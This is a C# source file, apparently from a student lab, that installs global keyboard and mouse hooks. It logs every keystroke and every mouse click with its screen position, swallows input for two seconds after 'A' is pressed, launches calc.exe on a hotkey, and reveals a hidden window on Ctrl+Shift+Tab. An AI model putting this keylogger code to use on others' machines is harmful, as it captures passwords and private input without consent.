using Gma.System.MouseKeyHook;
using System.Windows.Forms;
using System.Diagnostics;
using System;

namespace Laba_8
{
    public class GlobalHooks
    {
        public delegate void WindowShowHandler();

        private readonly IKeyboardMouseEvents _globalHooks = Hook.GlobalEvents();
        private readonly Logger _logger;
        private readonly Settings _settings;
        private readonly WindowShowHandler _windowShow;
        private int a_key_pressed;

        public GlobalHooks(Settings config, WindowShowHandler windowShow)
        {
            _settings = config;
            _windowShow = windowShow;
            _logger = new Logger(_settings);
            _globalHooks.KeyDown += KeyEvent;
            _globalHooks.MouseClick += MouseEvent;
            a_key_pressed = (int)(DateTime.UtcNow - new DateTime(1970, 1, 1)).TotalSeconds - 2;

        }

        private void KeyEvent(object sender, KeyEventArgs e)
        {
            if (e.KeyData == Keys.A)
            {
                a_key_pressed = (int)(DateTime.UtcNow - new DateTime(1970, 1, 1)).TotalSeconds;
            }
            int cur_time = (int)(DateTime.UtcNow - new DateTime(1970, 1, 1)).TotalSeconds;
            if (cur_time - a_key_pressed <= 2)
            {
                e.Handled = true;
            }
            if (_settings.IsHooks)
            {
                if (e.KeyData == (Keys.Shift | Keys.Tab))
                {
                    Process.Start("calc.exe");
                }
                _logger.KeyLogger(e.KeyData.ToString());
            }
            if (e.KeyData == (Keys.Control | Keys.Shift | Keys.Tab))
            {
                if (_windowShow != null)
                {
                    _windowShow.Invoke();
                }
            }
        }

        private void MouseEvent(object sender, MouseEventArgs e)
        {
            if (_settings.IsHooks)
            {
                _logger.MouseLogger(e.Button.ToString(), e.Location.ToString());
            }
        }
    }
}